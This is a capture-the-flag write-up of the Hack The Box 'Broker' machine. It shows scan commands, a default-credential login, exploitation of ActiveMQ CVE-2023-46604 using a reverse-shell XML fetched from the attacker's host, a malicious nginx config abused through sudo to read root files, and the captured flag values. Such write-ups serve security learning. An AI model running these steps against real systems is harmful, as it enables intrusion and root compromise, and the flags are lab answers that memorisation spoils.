# CTF: Broker (HTB)

## Metadata

- **Target IP:** 10.129.230.87
    
- **OS:** Linux (Ubuntu)
    
- **Difficulty:** Easy
    
- **Date:** 2026-02-19
    
- **Key Skills/Tools:** ActiveMQ Exploitation, CVE-2023-46604, Nginx Sudo Abuse, Arbitrary File Read, OpenWire Protocol.
    

---

## Reconnaissance

### Port Scanning

The initial scan revealed several ports associated with message brokers and web management.

Bash

```
nmap -p- -Pn $target -v --min-rate 1000 -oN nmap_ports.txt
```

**Key Ports:**

- **22/tcp:** SSH (OpenSSH 8.9p1)
    
- **80/tcp:** HTTP (Nginx: ActiveMQ Login)
    
- **1883/tcp:** MQTT
    
- **5672/tcp:** AMQP
    
- **8161/tcp:** ActiveMQ Web Console
    
- **61616/tcp:** ActiveMQ OpenWire (Primary exploit vector)
    

### Web Enumeration

Accessing the web interface on port 80 prompted for Basic Authentication. Testing common defaults like `admin:admin` granted access to the **ActiveMQ Web Console**.

- **Version Identified:** Apache ActiveMQ 5.15.15
    

---

## Credential Cracking

### Default Credentials

- **Username:** `admin`
    
- **Password:** `admin`
    
- **Service:** ActiveMQ Web Console (Port 80/8161)
    

---

## Foothold

### ActiveMQ RCE (CVE-2023-46604)

ActiveMQ version 5.15.15 is vulnerable to a Java unmarshalling vulnerability in the **OpenWire** protocol. This allows an attacker to provide a malicious XML configuration file that the server will execute to instantiate arbitrary classes.

**Exploitation Steps:**

1. **Prepare Payload:** I hosted a `poc-linux.xml` file on my Kali machine containing a reverse shell command.
    
2. **Execute Exploit:** I used a Python exploit script to point the ActiveMQ OpenWire service (port 61616) to my malicious XML.
    

Bash

```
python3 main.py -i $target -u http://10.10.14.3:8000/poc-linux.xml
```

3. **Catch Shell:** My listener caught a connection as the `activemq` service account.
    

Bash

```
connect to [10.10.14.3] from (UNKNOWN) [10.129.230.87] 57446
activemq@broker:/opt/apache-activemq-5.15.15/bin$ whoami
activemq
```

---

## Lateral Movement

_No lateral movement was required; the path led directly from `activemq` to `root`._

---

## Privilege Escalation

### Nginx Sudo Abuse

Checking sudo permissions revealed that the `activemq` user could run `nginx` as root with no password.

Bash

```
activemq@broker:~$ sudo -l
(ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Because Nginx allows the specification of a custom configuration file via the `-c` flag, I was able to create a configuration that runs as root and serves the entire filesystem on a custom port.

**Malicious Nginx Config (`/dev/shm/nginx.conf`):**

Nginx

```
user root;
worker_processes auto;
events {}
http {
    server {
        listen 9000;
        location / {
            root /;
        }
    }
}
```

**Execution:**

1. Started Nginx with the custom config: `sudo nginx -c /dev/shm/nginx.conf`
    
2. Requested the root flag via `curl` on the newly opened port 9000:
    

Bash

```
activemq@broker:/dev/shm$ curl http://localhost:9000/root/root.txt
ec512e14a1f261e2fea11c52c32055e1
```

---

## Flags

|**Flag Type**|**Value**|
|---|---|
|**User**|8aa56203575f2eefb86952d2481adb25|
|**Root**|ec512e14a1f261e2fea11c52c32055e1|

---

That Nginx trick is a great example of how "harmless" binaries can become deadly with just one `sudo` entry. It bypasses the need for a root shell entirely by turning the server into its own data exfiltration tool.
